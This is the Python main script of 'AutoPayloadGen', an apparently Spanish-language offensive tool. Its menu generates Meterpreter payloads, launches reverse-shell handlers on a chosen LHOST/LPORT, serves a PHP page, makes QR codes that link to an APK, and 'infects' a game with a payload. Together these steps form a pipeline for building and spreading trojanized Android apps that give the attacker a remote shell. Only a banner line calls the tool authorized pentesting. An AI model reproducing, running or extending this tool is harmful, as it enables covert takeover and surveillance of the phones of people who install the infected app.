import os
import sys
import threading
import logging
import re
import ipaddress
from threading import Thread
from typing import Optional, Tuple
import getpass
import hashlib
import time
from modules.autopayload import generar_payload
from modules.handlergen import lanzar_handler
from modules.qrgen import generar_qr
from modules.webserver import iniciar_php_server_30min
from modules.main_menu import mostrar_menu_principal
from modules.infectar_juego import seleccionar_e_infectar_juego
import web.app as dashboard

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('autopayload.log', mode='a'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    logging.getLogger('requests').setLevel(logging.WARNING)
    logging.getLogger('urllib3').setLevel(logging.WARNING)

class SecurityValidator:
    
    @staticmethod
    def validate_ip(ip_address: str) -> bool:
        try:
            ipaddress.ip_address(ip_address)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def validate_port(port: str) -> bool:
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    @staticmethod
    def validate_payload_type(payload: str) -> bool:
        pattern = r'^[a-zA-Z0-9/_-]+$'
        return bool(re.match(pattern, payload)) and len(payload) <= 100
    
    @staticmethod
    def validate_url(url: str) -> bool:
        pattern = r'^https?://[\w\-\.]+(:\d+)?(/.*)?$'
        return bool(re.match(pattern, url)) and len(url) <= 500
    
    @staticmethod
    def sanitize_input(user_input: str) -> str:

        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']']
        sanitized = user_input
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        return sanitized.strip()

def clear_screen():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except Exception as e:
        logging.warning(f"No se pudo limpiar la pantalla: {e}")

def banner():
    clear_screen()
    print("\033[1;92m")
    print(r"""
 █████╗ ██╗   ██╗████████╗ ██████╗ ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗  ██████╗ ███████╗███╗   ██╗
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝████╗  ██║
███████║██║   ██║   ██║   ██║   ██║██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║██║  ███╗█████╗  ██╔██╗ ██║
██╔══██║██║   ██║   ██║   ██║   ██║██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║██║   ██║██╔══╝  ██║╚██╗██║
██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝╚██████╔╝███████╗██║ ╚████║
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝
    """)
    print("\033[1;91m AutoPayloadGen | Emiliano Hernández \033[0m\n")
    print("\033[1;93mADVERTENCIA: Esta herramienta es solo para pruebas de penetración autorizadas\033[0m\n")

def get_secure_input(prompt: str, input_type: str = "general") -> Optional[str]:
    validator = SecurityValidator()
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        try:
            if input_type == "password":
                user_input = getpass.getpass(prompt)
            else:
                user_input = input(prompt).strip()
            
            if not user_input:
                print("\033[1;91mLa entrada no puede estar vacía\033[0m")
                attempts += 1
                continue
            
            sanitized_input = validator.sanitize_input(user_input)

            if input_type == "ip" and not validator.validate_ip(sanitized_input):
                print("\033[1;91mDirección IP inválida\033[0m")
                attempts += 1
                continue
            elif input_type == "port" and not validator.validate_port(sanitized_input):
                print("\033[1;91mPuerto inválido (1-65535)\033[0m")
                attempts += 1
                continue
            elif input_type == "payload" and not validator.validate_payload_type(sanitized_input):
                print("\033[1;91mTipo de payload inválido\033[0m")
                attempts += 1
                continue
            elif input_type == "url" and not validator.validate_url(sanitized_input):
                print("\033[1;91mURL inválida\033[0m")
                attempts += 1
                continue
            
            return sanitized_input
            
        except KeyboardInterrupt:
            print("\n\033[1;91mOperación cancelada por el usuario\033[0m")
            return None
        except Exception as e:
            logging.error(f"Error al obtener entrada del usuario: {e}")
            attempts += 1
            continue
    
    print(f"\033[1;91mMáximo número de intentos excedido ({max_attempts})\033[0m")
    return None

def check_permissions():
    if os.geteuid() != 0:
        print("\033[1;93mAdvertencia: No se están ejecutando con privilegios de root\033[0m")
        print("\033[1;93m Algunas funciones pueden requerir permisos elevados\033[0m")
        response = input("\n¿Continuar? (s/N): ").strip().lower()
        if response != 's':
            sys.exit(0)

def secure_thread_start(target_function, *args, **kwargs):
    def wrapped_target():
        try:
            target_function(*args, **kwargs)
        except Exception as e:
            logging.error(f"Error en hilo {target_function.__name__}: {e}")
    
    thread = Thread(target=wrapped_target, daemon=True)
    thread.start()
    return thread

def generate_session_id() -> str:
    timestamp = str(time.time())
    return hashlib.sha256(timestamp.encode()).hexdigest()[:16]

def main():
    try:
        setup_logging()
        logging.info("Iniciando AutoPayloadGen versión segura")
        
        check_permissions()
        
        session_id = generate_session_id()
        logging.info(f"Sesión iniciada: {session_id}")
        
        banner()
        
        try:
            web_thread = secure_thread_start(dashboard.iniciar_panel_web)
            logging.info("Panel web iniciado en hilo separado")
        except Exception as e:
            logging.error(f"Error al iniciar panel web: {e}")
            print("\033[1;91mError al iniciar panel web\033[0m")

        while True:
            try:
                opcion = mostrar_menu_principal()
                
                if opcion == "1":
                    print("\n\033[1;96mGenerando payload automático...\033[0m")
                    try:
                        result = generar_payload()
                        if result:
                            payload, lhost, lport = result
                            if (SecurityValidator.validate_ip(lhost) and 
                                SecurityValidator.validate_port(str(lport)) and 
                                SecurityValidator.validate_payload_type(payload)):
                                
                                lanzar_handler(payload, lhost, lport)
                                logging.info(f"Handler lanzado: {payload} en {lhost}:{lport}")
                            else:
                                print("\033[1;91mDatos de payload inválidos\033[0m")
                        else:
                            print("\033[1;91mError al generar payload\033[0m")
                    except Exception as e:
                        logging.error(f"Error generando payload automático: {e}")
                        print("\033[1;91mError interno al generar payload\033[0m")
                
                elif opcion == "2":
                    print("\n\033[1;96mConfiguración manual de handler...\033[0m")
                    
                    lhost = get_secure_input("LHOST: ", "ip")
                    if not lhost:
                        continue
                    
                    lport = get_secure_input("LPORT: ", "port")
                    if not lport:
                        continue
                    
                    tipo_payload = get_secure_input("Payload (ej: android/meterpreter/reverse_https): ", "payload")
                    if not tipo_payload:
                        continue
                    
                    try:
                        lanzar_handler(tipo_payload, lhost, lport)
                        logging.info(f"Handler manual lanzado: {tipo_payload} en {lhost}:{lport}")
                    except Exception as e:
                        logging.error(f"Error lanzando handler manual: {e}")
                        print("\033[1;91mError al lanzar handler\033[0m")
                
                elif opcion == "3":
                    print("\n\033[1;96mIniciando servidor PHP por 30 minutos...\033[0m")
                    try:
                        secure_thread_start(iniciar_php_server_30min)
                        logging.info("Servidor PHP iniciado")
                        print("\033[1;92mServidor PHP iniciado correctamente\033[0m")
                    except Exception as e:
                        logging.error(f"Error iniciando servidor PHP: {e}")
                        print("\033[1;91mError al iniciar servidor PHP\033[0m")
                
                elif opcion == "4":
                    print("\n\033[1;96mGenerando código QR...\033[0m")
                    url = get_secure_input("Ingresa la URL del APK: ", "url")
                    if url:
                        try:
                            generar_qr(url)
                            logging.info(f"QR generado para URL: {url}")
                            print("\033[1;92mCódigo QR generado correctamente\033[0m")
                        except Exception as e:
                            logging.error(f"Error generando QR: {e}")
                            print("\033[1;91mError al generar código QR\033[0m")
                
                elif opcion == "5":
                    print("\n\033[1;96mInfectando juego...\033[0m")
                    try:
                        seleccionar_e_infectar_juego()
                        logging.info("Proceso de infección de juego completado")
                    except Exception as e:
                        logging.error(f"Error infectando juego: {e}")
                        print("\033[1;91mError al infectar juego\033[0m")
                
                elif opcion == "6":
                    print("\n\033[1;96mCerrando AutoPayloadGen de forma segura...\033[0m")
                    logging.info(f"Sesión terminada: {session_id}")
                    break
                
                else:
                    print("\033[1;91mOpción inválida\033[0m")
                    
            except KeyboardInterrupt:
                print("\n\n\033[1;91mInterrupción del usuario detectada\033[0m")
                logging.info(f"Sesión interrumpida por usuario: {session_id}")
                break
            except Exception as e:
                logging.error(f"Error en menú principal: {e}")
                print("\033[1;91mError interno en menú principal\033[0m")
                continue
    
    except Exception as e:
        logging.critical(f"Error crítico en main(): {e}")
        print("\033[1;91mError crítico en la aplicación\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()